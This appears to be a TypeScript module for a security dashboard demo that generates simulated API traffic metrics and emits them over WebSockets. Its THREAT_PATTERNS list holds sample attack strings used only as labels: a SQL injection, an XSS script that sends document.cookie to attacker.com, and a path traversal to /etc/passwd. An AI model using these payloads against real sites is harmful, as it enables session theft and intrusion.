import { Server } from 'socket.io';

export interface MetricPayload {
  serviceName: string;
  endpoint: string;
  method: string;
  statusCode: number;
  responseTimeMs: number;
  cpuUsagePct: number;
  memoryUsageMb: number;
  clientIp: string;
  timestamp: string;
  isThreat: boolean;
  threatType?: string;
  payloadSample?: string;
}

const SERVICES = ['auth-service', 'payment-gateway', 'user-api'];
const ENDPOINTS = ['/api/v1/login', '/api/v1/checkout', '/api/v1/users', '/api/v1/data', '/api/v1/health'];
const METHODS = ['GET', 'POST', 'PUT', 'DELETE'];

const THREAT_PATTERNS = [
  { threatType: 'SQL Injection', payload: "' OR '1'='1 -- SELECT * FROM users;", endpoint: '/api/v1/login' },
  { threatType: 'XSS Attempt', payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>", endpoint: '/api/v1/users' },
  { threatType: 'DDoS Pattern', payload: 'HIGH_VOLUME_BURST_RPS_1000', endpoint: '/api/v1/data' },
  { threatType: 'Path Traversal', payload: '../../../../etc/passwd', endpoint: '/api/v1/checkout' }
];

export function startTrafficSimulation(io: Server, onThreatDetected?: (metric: MetricPayload) => void) {
  console.log('⚡ Traffic & Security Simulator Engine started...');

  setInterval(() => {
    const isThreat = Math.random() < 0.15; // 15% chance of security event
    const serviceName = SERVICES[Math.floor(Math.random() * SERVICES.length)];
    const method = METHODS[Math.floor(Math.random() * METHODS.length)];
    
    let endpoint = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
    let statusCode = Math.random() < 0.85 ? 200 : (Math.random() < 0.5 ? 404 : 500);
    let responseTimeMs = Math.floor(Math.random() * 180) + 20; // 20ms - 200ms
    let cpuUsagePct = Number((Math.random() * 30 + 15).toFixed(1)); // 15% - 45%
    let memoryUsageMb = Number((Math.random() * 200 + 400).toFixed(1)); // 400MB - 600MB
    let threatType: string | undefined;
    let payloadSample: string | undefined;

    if (isThreat) {
      const threat = THREAT_PATTERNS[Math.floor(Math.random() * THREAT_PATTERNS.length)];
      threatType = threat.threatType;
      payloadSample = threat.payload;
      endpoint = threat.endpoint;
      statusCode = threatType === 'DDoS Pattern' ? 429 : 400;
      responseTimeMs = Math.floor(Math.random() * 1200) + 500; // Spike in latency
      cpuUsagePct = Number((Math.random() * 40 + 55).toFixed(1)); // High CPU usage
    }

    const metric: MetricPayload = {
      serviceName,
      endpoint,
      method,
      statusCode,
      responseTimeMs,
      cpuUsagePct,
      memoryUsageMb,
      clientIp: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
      timestamp: new Date().toISOString(),
      isThreat,
      threatType,
      payloadSample
    };

    // Broadcast metric to all connected WebSocket dashboard clients
    io.emit('metrics:tick', metric);

    if (isThreat && onThreatDetected) {
      onThreatDetected(metric);
    }
  }, 1200); // Ticks every 1.2 seconds
}
